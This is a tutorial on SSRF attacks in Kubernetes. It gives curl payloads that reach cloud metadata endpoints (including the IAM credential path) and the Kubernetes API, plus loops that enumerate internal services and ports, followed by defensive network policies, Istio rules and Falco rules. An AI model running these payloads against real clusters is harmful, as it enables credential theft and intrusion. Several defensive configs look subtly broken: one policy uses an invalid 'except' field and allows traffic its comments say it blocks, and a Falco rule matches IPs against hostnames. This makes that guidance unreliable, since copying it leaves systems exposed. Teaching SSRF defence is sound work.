# SSRF Exploitation in Kubernetes Environments

## Context & Problem

**Business Problem**: Server-Side Request Forgery (SSRF) in containerized environments allows attackers to access internal services, cloud metadata APIs, and perform lateral movement within the cluster, leading to data breaches and privilege escalation.

**Real-World Impact**: 
- **Capital One Breach (2019)**: SSRF used to access AWS metadata service, compromising 100M+ customer records
- **Cloud metadata API access**: Steal IAM credentials, instance profiles, and security keys
- **Internal service enumeration**: Discover and exploit internal APIs not intended for external access
- **Lateral movement**: Use pod-to-pod communication to escalate privileges

## First Principles: What Makes SSRF Dangerous in Kubernetes?

### Why Kubernetes Amplifies SSRF Risk
1. **Rich Internal Network**: Pods can communicate freely by default
2. **Cloud Metadata Access**: Pods inherit cloud instance permissions
3. **Service Discovery**: Kubernetes DNS makes internal services discoverable
4. **Microservices Architecture**: More internal APIs = larger attack surface
5. **Shared Network Namespace**: Pods share node network interfaces

### The SSRF Attack Chain
```
User Input → Vulnerable App → Internal HTTP Request → Target Service
     ↓             ↓                    ↓                    ↓
Malicious URL → SSRF Endpoint → Cloud Metadata API → Credential Theft
```

## Production Implementation: SSRF Attack Scenarios

### Scenario 1: Cloud Metadata API Exploitation

#### Vulnerable Application (NEVER deploy in production)
```yaml
# WARNING: This is a deliberately vulnerable example for learning
apiVersion: apps/v1
kind: Deployment
metadata:
  name: vulnerable-ssrf-app
  namespace: security-demo
spec:
  replicas: 1
  selector:
    matchLabels:
      app: vulnerable-ssrf
  template:
    metadata:
      labels:
        app: vulnerable-ssrf
    spec:
      containers:
      - name: app
        image: nginx:alpine
        ports:
        - containerPort: 80
        env:
        - name: ENVIRONMENT
          value: "demo"
        # ❌ No network policies = can access anything
        # ❌ No egress filtering = can reach metadata APIs
        # ❌ No input validation = SSRF vulnerability
---
apiVersion: v1
kind: Service
metadata:
  name: vulnerable-ssrf-service
  namespace: security-demo
spec:
  selector:
    app: vulnerable-ssrf
  ports:
  - port: 80
    targetPort: 80
  type: ClusterIP
```

#### SSRF Attack Payload Examples
```bash
# Attack 1: AWS EC2 Metadata Service
curl "http://vulnerable-app/fetch?url=http://169.254.169.254/latest/meta-data/"

# Attack 2: IAM Role Credentials
curl "http://vulnerable-app/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Attack 3: Azure Instance Metadata
curl "http://vulnerable-app/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata:true"

# Attack 4: GCP Metadata Service
curl "http://vulnerable-app/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/" -H "Metadata-Flavor: Google"

# Attack 5: Kubernetes API Server Discovery
curl "http://vulnerable-app/fetch?url=https://kubernetes.default.svc.cluster.local/"

# Attack 6: Internal Service Enumeration
curl "http://vulnerable-app/fetch?url=http://database-service.production.svc.cluster.local:5432/"
```

### Scenario 2: Internal Service Discovery and Exploitation

#### Discovering Internal Services via SSRF
```yaml
# Internal database service (typical production setup)
apiVersion: v1
kind: Service
metadata:
  name: internal-database
  namespace: production
spec:
  selector:
    app: postgres
  ports:
  - port: 5432
    targetPort: 5432
  type: ClusterIP  # Internal only, but accessible via SSRF
---
# Admin API service (should be internal only)
apiVersion: v1
kind: Service
metadata:
  name: admin-api
  namespace: production
  labels:
    tier: admin
spec:
  selector:
    app: admin-backend
  ports:
  - port: 8080
    targetPort: 8080
  type: ClusterIP
```

#### SSRF Enumeration Attack Commands
```bash
# Discover services using Kubernetes DNS
for ns in default kube-system production; do
  for svc in database admin-api metrics-server api-gateway; do
    curl "http://vulnerable-app/fetch?url=http://${svc}.${ns}.svc.cluster.local/"
  done
done

# Port scanning internal services
for port in 80 443 5432 3306 6379 9200 8080 8443; do
  curl "http://vulnerable-app/fetch?url=http://internal-service:${port}/"
done

# Probe for admin interfaces
curl "http://vulnerable-app/fetch?url=http://admin-api.production.svc.cluster.local:8080/admin/"
curl "http://vulnerable-app/fetch?url=http://admin-api.production.svc.cluster.local:8080/health"
curl "http://vulnerable-app/fetch?url=http://admin-api.production.svc.cluster.local:8080/metrics"
```

## Troubleshooting Scenarios: "What happens when this breaks at 2AM?"

### Crisis Scenario 1: AWS Bill Explosion
```bash
# Detection: Unusual AWS API calls
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole

# Investigation: Check for metadata API access
kubectl logs deployment/vulnerable-ssrf-app | grep "169.254.169.254"

# Immediate Response: Block metadata access
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: block-metadata-access
  namespace: security-demo
spec:
  podSelector:
    matchLabels:
      app: vulnerable-ssrf
  policyTypes:
  - Egress
  egress:
  - to: []
    ports:
    - protocol: TCP
      port: 53
    - protocol: UDP
      port: 53
  # Block all other egress including metadata APIs
EOF
```

### Crisis Scenario 2: Internal Database Breach
```bash
# Detection: Unusual database connections
kubectl logs deployment/postgres | grep "connection.*from.*10\."

# Investigation: Check for SSRF attacks
kubectl exec -it deployment/vulnerable-ssrf-app -- netstat -an | grep ESTABLISHED

# Emergency Response: Isolate affected pods
kubectl patch deployment vulnerable-ssrf-app -p '{"spec":{"replicas":0}}'
kubectl label namespace security-demo quarantine=true

# Network isolation
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: emergency-quarantine
  namespace: security-demo
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
EOF
```

## Evolution & Alternatives: Defense in Depth

### Modern SSRF Protection Stack

#### Layer 1: Input Validation and Allowlist
```yaml
# Secure application with input validation
apiVersion: v1
kind: ConfigMap
metadata:
  name: secure-app-config
data:
  allowed-hosts.json: |
    {
      "allowedHosts": [
        "api.external-service.com",
        "webhook.partner.com"
      ],
      "blockedCIDRs": [
        "10.0.0.0/8",
        "172.16.0.0/12", 
        "192.168.0.0/16",
        "169.254.169.254/32",
        "127.0.0.0/8"
      ]
    }
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: secure-app
spec:
  template:
    spec:
      containers:
      - name: app
        image: secure-app:latest
        env:
        - name: SSRF_PROTECTION
          value: "enabled"
        - name: ALLOWED_HOSTS_CONFIG
          value: "/config/allowed-hosts.json"
        volumeMounts:
        - name: config
          mountPath: /config
      volumes:
      - name: config
        configMap:
          name: secure-app-config
```

#### Layer 2: Network Policies - Zero Trust Egress
```yaml
# Strict egress control to prevent SSRF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: strict-egress-control
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: web-app
  policyTypes:
  - Egress
  egress:
  # Allow DNS resolution only
  - to: []
    ports:
    - protocol: UDP
      port: 53
    - protocol: TCP
      port: 53
  # Allow only specific external APIs
  - to: []
    ports:
    - protocol: TCP
      port: 443
    # Additional restrictions via CNI or service mesh
  # Explicitly deny metadata API access
  - to:
    - namespaceSelector: {}
    ports:
    - protocol: TCP
      port: 80
    - protocol: TCP
      port: 443
---
# Block metadata API access explicitly
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: block-cloud-metadata
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  # Allow everything except metadata APIs
  - to:
    - podSelector: {}
  - to:
    - namespaceSelector: {}
  # Explicitly block metadata IP ranges
  - to: []
    ports:
    - protocol: TCP
      port: 80
    except:
    - podSelector:
        matchLabels:
          block-metadata: "true"
```

#### Layer 3: Service Mesh with Istio
```yaml
# Istio ServiceEntry for allowed external services
apiVersion: networking.istio.io/v1beta1
kind: ServiceEntry
metadata:
  name: allowed-external-api
spec:
  hosts:
  - api.partner.com
  ports:
  - number: 443
    name: https
    protocol: HTTPS
  location: MESH_EXTERNAL
  resolution: DNS
---
# Istio DestinationRule with TLS
apiVersion: networking.istio.io/v1beta1
kind: DestinationRule
metadata:
  name: external-api-tls
spec:
  host: api.partner.com
  trafficPolicy:
    tls:
      mode: SIMPLE
---
# Block metadata API via VirtualService
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: block-metadata-access
spec:
  hosts:
  - "169.254.169.254"
  http:
  - fault:
      abort:
        percentage:
          value: 100
        httpStatus: 403
    route:
    - destination:
        host: blackhole-service
```

#### Layer 4: Pod Security Context Restrictions
```yaml
# Secure pod configuration
apiVersion: apps/v1
kind: Deployment
metadata:
  name: hardened-app
spec:
  template:
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        fsGroup: 2000
        seccompProfile:
          type: RuntimeDefault
      containers:
      - name: app
        securityContext:
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          runAsNonRoot: true
          capabilities:
            drop:
            - ALL
        # Disable service account token mounting if not needed
      automountServiceAccountToken: false
      # Use minimal service account
      serviceAccountName: restricted-sa
```

### Advanced SSRF Detection with Falco

```yaml
# Falco rules for SSRF detection
apiVersion: v1
kind: ConfigMap
metadata:
  name: falco-ssrf-rules
data:
  ssrf-rules.yaml: |
    - rule: Suspicious Outbound Connection to Metadata API
      desc: Detect connections to cloud metadata APIs
      condition: >
        outbound and
        (fd.rip="169.254.169.254" or 
         fd.rip="metadata.google.internal" or
         (fd.rip startswith "169.254."))
      output: >
        Suspicious connection to metadata API 
        (container=%container.name dest_ip=%fd.rip dest_port=%fd.rport 
         process=%proc.name command=%proc.cmdline)
      priority: ERROR
      
    - rule: Internal Service Port Scanning
      desc: Detect rapid connections to multiple internal ports
      condition: >
        outbound and
        (fd.rip startswith "10." or fd.rip startswith "172." or fd.rip startswith "192.168.") and
        not proc.name in (kubelet, kube-proxy)
      output: >
        Potential internal port scanning detected
        (container=%container.name dest_ip=%fd.rip dest_port=%fd.rport 
         process=%proc.name)
      priority: WARNING
      
    - rule: Kubernetes API Unauthorized Access
      desc: Detect unauthorized Kubernetes API access
      condition: >
        outbound and 
        fd.rip="kubernetes.default.svc.cluster.local" and
        not proc.name in (kubectl, kube-proxy, kubelet)
      output: >
        Unauthorized Kubernetes API access attempt
        (container=%container.name process=%proc.name command=%proc.cmdline)
      priority: ERROR
```

## Next Steps: Building SSRF-Resistant Applications

### Secure Development Patterns
1. **Input Validation**: Implement strict URL validation and allowlists
2. **Network Segmentation**: Use network policies and service mesh
3. **Zero Trust Egress**: Default deny all outbound connections
4. **Monitoring**: Deploy runtime security monitoring
5. **Testing**: Include SSRF testing in CI/CD pipelines

### Real-World Testing Commands
```bash
# Test network policies
kubectl exec -it test-pod -- curl http://169.254.169.254/latest/meta-data/

# Verify egress restrictions
kubectl exec -it app-pod -- nslookup internal-service.production.svc.cluster.local

# Check Falco alerts
kubectl logs -n falco daemonset/falco | grep -i "metadata\|ssrf\|suspicious"

# Monitor egress traffic
kubectl exec -it app-pod -- netstat -an | grep -E "^tcp.*ESTABLISHED"
```

### Business Impact Measurement
- **Security**: Prevent data breaches and credential theft
- **Compliance**: Meet security audit requirements
- **Cost**: Avoid cloud bill explosion from compromised credentials
- **Availability**: Prevent lateral movement and service disruption

**Production Reality**: SSRF attacks are among the top 10 OWASP vulnerabilities and are especially dangerous in cloud-native environments. Implementing comprehensive SSRF protection is not optional—it's a business necessity.